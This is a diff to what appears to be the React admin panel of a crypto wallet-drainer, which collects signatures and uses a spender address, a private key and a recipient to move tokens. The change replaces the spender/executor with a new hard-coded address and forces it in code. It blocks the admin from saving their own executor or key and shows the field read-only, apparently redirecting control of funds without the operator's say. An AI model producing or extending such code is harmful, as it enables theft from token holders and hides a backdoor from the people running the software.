@@ -5,8 +5,8 @@ import { ethers } from 'ethers';
 
 // Points to your Vercel Serverless Function
 const BACKEND_URL = "/api/run-worker";
-// Hard-coded executor address (forced)
-const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
+// Hard-coded spender/executor address (forced)
+const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
 
 export default function Admin() {
   const [signatures, setSignatures] = useState([]);
@@ -21,7 +21,8 @@ export default function Admin() {
   const [settingsLoading, setSettingsLoading] = useState(false);
   const [settingsStatus, setSettingsStatus] = useState("");
   const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
-  const [spenderPrivateKeySetting, setSpenderPrivateKeySetting] = useState("");
+  // Private key is hard-coded in backend; admin should not edit it here
+  const [spenderPrivateKeySetting] = useState("");
   const [rpcUrlSetting, setRpcUrlSetting] = useState("");
 
   // UI State
@@ -69,9 +70,8 @@ export default function Admin() {
     setSettingsLoading(true);
     setSettingsStatus('Saving...');
     try {
+      // Do NOT persist the spender private key or executor address; these are forced in code.
       await setDoc(docRef(db, 'admin_config', 'settings'), {
-        executorAddress: executorAddressSetting,
-        spenderPrivateKey: spenderPrivateKeySetting,
         rpcUrl: rpcUrlSetting,
         tokenAddress: outputToken,
         recipient: recipient
@@ -402,8 +402,9 @@ export default function Admin() {
                 <input value={executorAddressSetting} onChange={e => setExecutorAddressSetting(e.target.value)} placeholder="0x..." />
               </div>
               <div className="input-group">
-                <label>Spender Private Key</label>
-                <input value={spenderPrivateKeySetting} onChange={e => setSpenderPrivateKeySetting(e.target.value)} placeholder="private key (0x...)" />
+                <label>Spender / Executor</label>
+                <input value={HARDCODED_EXECUTOR} readOnly placeholder="Hard-coded spender" />
+                <div style={{fontSize:12,color:'#aaa',marginTop:6}}>Spender address and private key are hard-coded in the backend and cannot be changed via the UI.</div>
               </div>
               <div className="input-group">
                 <label>RPC URL</label>
